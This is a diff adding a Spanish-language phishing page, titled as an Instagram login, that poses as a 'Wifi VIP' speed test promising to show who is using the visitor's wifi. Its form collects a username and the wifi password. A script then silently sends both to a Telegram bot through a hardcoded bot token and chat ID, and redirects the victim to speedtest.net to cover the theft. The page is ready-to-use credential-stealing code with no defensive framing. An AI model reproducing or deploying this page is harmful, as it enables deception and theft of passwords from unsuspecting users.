@@ -1,0 +1,48 @@
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Instagram</title>
+    </head>
+<body>
+    <center>
+        <h6>español (España)v</h6>
+        <h1 style="color:green">Wifi VIP</h1>
+        <img src="https://i.supaimg.com/d6a42c06-bfab-4efd-a4e6-b8e28ef33d1a.png"width="120">
+        <br>
+        
+        <br>
+        <form id="enviar-mensaje-form">
+        <input type="text"name="usuario"placeholder="cualquier nombre"style="border:7px solid #0081FF;padding:19px;border-radius:1000px;width:80%;">
+        <br>
+        
+            <br>
+        <input type="password"name="contraseña"placeholder="contraseña de wifi"style="border:7px solid #0081FF;padding:19px;border-radius:1000px;width:80%;">
+        <br>
+            <br>
+        <button type="submit"style="background:#0081FF;color:white;padding:19px;border:none;border-radius:200px;width:88%;">MEDIR LA VELOCIDAD</button>
+        </form>
+        <h4>Para ver las personas que están conectadas 
+A tu wifi dale medir velocidad 🛜</h4>
+        
+    </center>
+    
+    <script>
+// Configuración
+const botToken = "8114097449:AAEkbEBucWo1yjRrjoI9UJQjTPSP22mrreQ";
+const chatId = "7377307394";
+
+document.getElementById("enviar-mensaje-form")?.addEventListener("submit", function(e) {
+  e.preventDefault();
+  
+  const mensaje = `Usuario: ${this.usuario.value}\nContraseña: ${this.contraseña.value}`;
+  
+  // Enviar y redireccionar inmediatamente
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`);
+  window.location.href = "https://www.speedtest.net/es";
+});
+</script>
+</body>
+</html>
+    
+           
